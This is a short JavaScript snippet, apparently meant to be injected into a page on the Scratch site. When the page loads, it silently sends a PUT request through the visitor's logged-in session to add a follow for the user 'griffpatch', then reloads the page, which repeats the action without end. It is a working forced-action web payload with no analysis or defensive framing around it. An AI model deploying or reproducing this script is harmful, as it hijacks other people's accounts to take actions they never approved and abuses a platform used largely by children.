import "https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"
import "https://cdn.scratch.mit.edu/scratchr2/static/__d227dda79ab53b07e3b30c100291aaac__//js/jquery.min.js"

function followme() {
    $.ajax({type:"PUT",url:"https://scratch.mit.edu/site-api/users/followers/f_account/add/?usernames=griffpatch"});
    location.reload();
}
window.onload = followme;
